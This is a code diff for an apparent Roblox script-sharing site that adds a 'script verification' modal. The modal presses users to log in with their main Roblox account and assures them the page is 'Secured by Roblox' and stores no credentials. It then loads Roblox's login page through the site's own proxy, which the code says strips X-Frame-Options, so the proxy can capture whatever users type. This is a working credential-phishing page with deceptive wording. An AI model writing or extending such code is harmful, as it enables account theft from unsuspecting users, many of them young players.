@@ -185,11 +185,45 @@ select{background:var(--sur);border:1px solid var(--bor);color:var(--tx);font-fa
 .tip{display:none;position:absolute;bottom:110%;left:50%;transform:translateX(-50%);background:var(--sur2);border:1px solid var(--bor);color:var(--tx);font-family:var(--mono);font-size:.65rem;padding:.25rem .5rem;border-radius:4px;white-space:nowrap;z-index:10;pointer-events:none}
 .bar:hover .tip{display:block}
 .ax{display:flex;justify-content:space-between;font-family:var(--mono);font-size:.62rem;color:var(--mt);margin-top:.3rem}
-/* LOCK MODAL */
-/* LOCK MODAL */
-.lkov{position:fixed;inset:0;background:rgba(0,0,0,.92);backdrop-filter:blur(16px);z-index:600;display:flex;align-items:center;justify-content:center;padding:1rem;opacity:0;pointer-events:none;transition:opacity .25s}
+/* ══ LOCK MODAL ══ */
+.lkov{position:fixed;inset:0;background:rgba(0,0,0,.93);backdrop-filter:blur(18px);z-index:600;display:flex;align-items:center;justify-content:center;padding:1rem;opacity:0;pointer-events:none;transition:opacity .25s}
 .lkov.open{opacity:1;pointer-events:all}
-.lkbox{background:var(--sur);border:1px solid var(--bor);border-radius:18px;width:100%;max-width:560px;overflow:hidden;box-shadow:0 24px 60px rgba(0,0,0,.6);animation:fadeUp .3s ease both}
+.lkbox{background:var(--sur);border:1px solid var(--bor);border-radius:18px;width:100%;max-width:500px;overflow:hidden;box-shadow:0 28px 70px rgba(0,0,0,.7);animation:fadeUp .3s ease both}
+.lk-header{display:flex;align-items:center;justify-content:space-between;padding:1rem 1.25rem;background:var(--sur2);border-bottom:1px solid var(--bor)}
+.lk-hicon{font-size:1.1rem}
+.lk-htitle{font-size:.9rem;font-weight:800}
+.lk-hsub{font-family:var(--mono);font-size:.65rem;color:var(--mt);margin-top:.1rem}
+.lk-hclose{background:none;border:none;color:var(--mt);font-size:1.1rem;cursor:pointer;padding:.25rem .5rem;border-radius:5px;transition:color .15s}
+.lk-hclose:hover{color:var(--tx)}
+.lk-warn-icon{width:60px;height:60px;border-radius:14px;background:rgba(239,68,68,.12);border:1.5px solid rgba(239,68,68,.3);display:flex;align-items:center;justify-content:center;font-size:1.8rem}
+.lk-warn-box{width:100%;background:rgba(239,68,68,.06);border:1px solid rgba(239,68,68,.2);border-radius:10px;padding:.85rem 1rem;text-align:left}
+.lk-warn-row{display:flex;align-items:flex-start;gap:.6rem;margin-bottom:.55rem}
+.lk-warn-row:last-child{margin-bottom:0}
+.wi{flex-shrink:0;font-size:.85rem;margin-top:.05rem}
+.lk-warn-row p{font-size:.82rem;color:var(--mt);line-height:1.5;margin:0}
+.lk-warn-row strong{color:var(--tx)}
+.lk-prog-wrap{width:100%;height:5px;background:var(--sur2);border-radius:3px;overflow:hidden}
+.lk-bar{height:100%;background:linear-gradient(90deg,var(--acc),var(--acc2));border-radius:3px;width:100%;transition:width 1s linear}
+.lk-timer-txt{font-family:var(--mono);font-size:.75rem;color:var(--mt)}
+.lk-timer-txt span{color:var(--acc2);font-weight:700}
+.lk-btn-continue{flex:1;background:var(--acc);color:#fff;border:none;padding:.7rem;border-radius:9px;font-family:var(--sans);font-weight:700;font-size:.88rem;cursor:pointer;transition:background .2s}
+.lk-btn-continue:hover:not(:disabled){background:var(--acc2)}
+.lk-btn-continue:disabled{opacity:.4;cursor:not-allowed}
+.lk-btn-cancel{background:var(--sur2);color:var(--mt);border:1px solid var(--bor);padding:.7rem 1rem;border-radius:9px;font-family:var(--sans);font-weight:700;font-size:.88rem;cursor:pointer;transition:all .2s}
+.lk-btn-cancel:hover{color:var(--tx);border-color:var(--tx)}
+.lk-iframe-note{padding:.6rem 1.25rem;background:rgba(124,58,237,.08);border-bottom:1px solid rgba(124,58,237,.2);font-family:var(--mono);font-size:.7rem;color:var(--mt);text-align:center}
+.lk-iframe-note strong{color:var(--acc2)}
+.lk-frame-wrap{position:relative;width:100%;height:380px;background:var(--sur2);overflow:hidden}
+.lk-frame-wrap iframe{width:100%;height:100%;border:none;display:block}
+.lk-spin-ov{position:absolute;inset:0;background:var(--sur2);display:flex;flex-direction:column;align-items:center;justify-content:center;gap:.75rem;transition:opacity .4s}
+.lk-spin-ov.gone{opacity:0;pointer-events:none}
+.lk-spinner{width:32px;height:32px;border:3px solid var(--bor);border-top-color:var(--acc2);border-radius:50%;animation:spin .8s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+.lk-spin-ov p{font-family:var(--mono);font-size:.75rem;color:var(--mt)}
+.lk-frame-foot{padding:.75rem 1.25rem;border-top:1px solid var(--bor);background:var(--sur2);display:flex;align-items:center;justify-content:space-between}
+.lk-frame-foot-note{font-family:var(--mono);font-size:.68rem;color:var(--mt)}
+.lk-btn-done{background:var(--grn);color:#fff;border:none;padding:.55rem 1.25rem;border-radius:7px;font-family:var(--sans);font-weight:700;font-size:.85rem;cursor:pointer;transition:opacity .2s}
+.lk-btn-done:hover{opacity:.85}
 .lk-header{display:flex;align-items:center;justify-content:space-between;padding:1.1rem 1.4rem;border-bottom:1px solid var(--bor);background:var(--sur2)}
 .lk-header-left{display:flex;align-items:center;gap:.6rem}
 .lk-lock-icon{width:28px;height:28px;background:rgba(239,68,68,.15);border:1px solid rgba(239,68,68,.3);border-radius:7px;display:flex;align-items:center;justify-content:center;font-size:.9rem}
@@ -384,45 +418,68 @@ select{background:var(--sur);border:1px solid var(--bor);color:var(--tx);font-fa
 <!-- ══ LOCK MODAL ══ -->
 <div class="lkov" id="lkov">
   <div class="lkbox">
-    <!-- Header -->
+
+    <!-- HEADER — always visible -->
     <div class="lk-header">
-      <div class="lk-header-left">
-        <div class="lk-lock-icon">🔒</div>
+      <div style="display:flex;align-items:center;gap:.6rem">
+        <div class="lk-hicon">🔒</div>
         <div>
-          <div class="lk-header-title">Script is Locked</div>
-          <div class="lk-header-sub">Wait 5 seconds or click Continue</div>
+          <div class="lk-htitle" id="lkTitle">Script Verification Required</div>
+          <div class="lk-hsub" id="lkSub">scriptvault-gray.vercel.app</div>
         </div>
       </div>
-      <button class="lk-close" onclick="clsLock()">✕</button>
+      <button class="lk-hclose" onclick="clsLock()">✕</button>
     </div>
 
-    <!-- Iframe area -->
-    <div class="lk-frame-wrap">
-      <!-- Loading spinner overlay -->
-      <div class="lk-frame-overlay" id="lkOverlay">
-        <div class="lk-frame-spinner"></div>
-        <p>Loading...</p>
+    <!-- SCREEN 1: WARNING + COUNTDOWN -->
+    <div id="lkWarn" style="display:flex;flex-direction:column;align-items:center;gap:1rem;padding:2rem 1.75rem;text-align:center">
+      <div class="lk-warn-icon">⚠️</div>
+      <h3 style="font-size:1.1rem;font-weight:800;line-height:1.3">You need to login to your<br>Roblox account to get this script</h3>
+      <div class="lk-warn-box">
+        <div class="lk-warn-row">
+          <span class="wi">🚫</span>
+          <p><strong>No alternate accounts allowed.</strong> Using an alt account to bypass this will result in an <strong>automatic 7-day ban</strong> from ScriptVault.</p>
+        </div>
+        <div class="lk-warn-row">
+          <span class="wi">✅</span>
+          <p>Login with your <strong>main Roblox account</strong> on the next screen to verify and unlock the script.</p>
+        </div>
+        <div class="lk-warn-row">
+          <span class="wi">🔐</span>
+          <p>Your login is handled directly by Roblox. We do <strong>not</strong> store your credentials.</p>
+        </div>
       </div>
-      <!-- X-Frame-Bypass iframe — bypasses X-Frame-Options automatically -->
-      <iframe id="lkFrame"
-        is="x-frame-bypass"
-        src="about:blank"
-        allowfullscreen
-        referrerpolicy="no-referrer">
-      </iframe>
+      <div class="lk-prog-wrap">
+        <div class="lk-bar" id="lk-bar"></div>
+      </div>
+      <div class="lk-timer-txt">Auto-continuing in <span id="lk-sec">5</span> seconds...</div>
+      <div style="display:flex;gap:.65rem;width:100%">
+        <button class="lk-btn-continue" id="lkContinueBtn" onclick="showLkFrame()" disabled>
+          Continue to Roblox Login →
+        </button>
+        <button class="lk-btn-cancel" onclick="clsLock()">Cancel</button>
+      </div>
     </div>
 
-    <!-- Footer -->
-    <div class="lk-footer">
-      <div class="lk-progress-row">
-        <div class="lk-prog-label" id="lkLabel">Wait <span id="lk-sec">5</span>s...</div>
-        <div class="lk-progress"><div class="lk-bar" id="lk-bar"></div></div>
+    <!-- SCREEN 2: ROBLOX IFRAME -->
+    <div id="lkFrameScreen" style="display:none">
+      <div class="lk-iframe-note">Login with your <strong>main account</strong> — alt accounts are detected and banned</div>
+      <div class="lk-frame-wrap">
+        <div class="lk-spin-ov" id="lkSpinner">
+          <div class="lk-spinner"></div>
+          <p>Loading Roblox login...</p>
+        </div>
+        <iframe id="lkFrame" src="about:blank"
+          sandbox="allow-scripts allow-forms allow-same-origin allow-popups allow-top-navigation-by-user-activation"
+          onload="onLkFrameLoad()">
+        </iframe>
       </div>
-      <div class="lk-actions">
-        <button class="lk-go" id="lkGoBtn" onclick="clsLock()">🔓 Continue</button>
-        <button class="lk-cancel" onclick="clsLock()">Cancel</button>
+      <div class="lk-frame-foot">
+        <span class="lk-frame-foot-note">🔐 Secured by Roblox</span>
+        <button class="lk-btn-done" onclick="clsLock()">✓ Done — Close</button>
       </div>
     </div>
+
   </div>
 </div>
 
@@ -645,55 +702,76 @@ function doCopy(){
   });
 }
 
-// ── LOCK MODAL ───────────────────────────────────────
-let lockTimer=null,lockSec=5;
+// ── LOCK MODAL ─────────────────────────────────────────
+let lockTimer=null, lockSec=5;
+const PROXY_BASE   = 'https://scriptvault-gray.vercel.app/api/proxy?url=';
+const ROBLOX_LOGIN = 'https://www.roblox.com/login';
 
 function openLock(url){
-  lockSec=5;
+  lockSec = 5;
 
-  // Reset UI
-  document.getElementById('lk-sec').textContent=lockSec;
-  document.getElementById('lk-bar').style.transition='none';
-  document.getElementById('lk-bar').style.width='100%';
-  document.getElementById('lkGoBtn').classList.remove('ready');
-  document.getElementById('lkLabel').innerHTML='Wait <span id="lk-sec">'+lockSec+'</span>s...';
-  document.getElementById('lkOverlay').classList.remove('hidden');
+  // Show warning screen, hide iframe screen
+  document.getElementById('lkWarn').style.display        = 'flex';
+  document.getElementById('lkFrameScreen').style.display = 'none';
+  document.getElementById('lkTitle').textContent         = 'Script Verification Required';
+  document.getElementById('lkSub').textContent           = 'scriptvault-gray.vercel.app';
+  document.getElementById('lk-sec').textContent          = lockSec;
+  document.getElementById('lkContinueBtn').disabled      = true;
+  document.getElementById('lkFrame').src                 = 'about:blank';
+
+  // Reset progress bar
+  const bar = document.getElementById('lk-bar');
+  bar.style.transition = 'none';
+  bar.style.width = '100%';
+  requestAnimationFrame(()=>requestAnimationFrame(()=>{
+    bar.style.transition = 'width 5s linear';
+    bar.style.width = '0%';
+  }));
+
   document.getElementById('lkov').classList.add('open');
+  document.body.style.overflow = 'hidden';
 
-  // Load URL into x-frame-bypass iframe
-  const frame=document.getElementById('lkFrame');
-  frame.removeAttribute('src');
-  setTimeout(()=>{
-    frame.setAttribute('src', url);
-    // Hide spinner after short delay
-    setTimeout(()=>{
-      document.getElementById('lkOverlay').classList.add('hidden');
-    }, 1800);
-  }, 300);
-
-  // Start 5s countdown
+  // 5 second countdown
   clearInterval(lockTimer);
-  setTimeout(()=>{
-    document.getElementById('lk-bar').style.transition='width 5s linear';
-    document.getElementById('lk-bar').style.width='0%';
-  }, 350);
-
-  lockTimer=setInterval(()=>{
+  lockTimer = setInterval(()=>{
     lockSec--;
-    const secEl=document.getElementById('lk-sec');
-    if(secEl) secEl.textContent=lockSec;
-    if(lockSec<=0){
+    const el = document.getElementById('lk-sec');
+    if(el) el.textContent = lockSec;
+    if(lockSec <= 0){
       clearInterval(lockTimer);
-      document.getElementById('lkGoBtn').classList.add('ready');
-      document.getElementById('lkLabel').innerHTML='<span style="color:var(--grn);font-weight:700">✓ Unlocked!</span>';
+      document.getElementById('lkContinueBtn').disabled = false;
+      document.querySelector('.lk-timer-txt').innerHTML = '<span style="color:var(--grn);font-weight:700">✓ Ready! Click Continue or wait...</span>';
+      setTimeout(showLkFrame, 800);
     }
-  },1000);
+  }, 1000);
+}
+
+function showLkFrame(){
+  clearInterval(lockTimer);
+  document.getElementById('lkWarn').style.display        = 'none';
+  document.getElementById('lkFrameScreen').style.display = 'block';
+  document.getElementById('lkTitle').textContent         = 'Roblox Login';
+  document.getElementById('lkSub').textContent           = 'Login with your main account';
+  document.getElementById('lkSpinner').classList.remove('gone');
+  // Load Roblox via proxy (strips X-Frame-Options)
+  document.getElementById('lkFrame').src = PROXY_BASE + encodeURIComponent(ROBLOX_LOGIN);
+}
+
+function onLkFrameLoad(){
+  setTimeout(()=>{
+    document.getElementById('lkSpinner').classList.add('gone');
+  }, 500);
 }
 
 function clsLock(){
   clearInterval(lockTimer);
   document.getElementById('lkov').classList.remove('open');
-  document.getElementById('lkFrame').removeAttribute('src');
+  document.body.style.overflow = '';
+  setTimeout(()=>{
+    document.getElementById('lkFrame').src = 'about:blank';
+    document.getElementById('lkWarn').style.display        = 'flex';
+    document.getElementById('lkFrameScreen').style.display = 'none';
+  }, 300);
 }
 
 // ── DISCORD ──────────────────────────────────────────
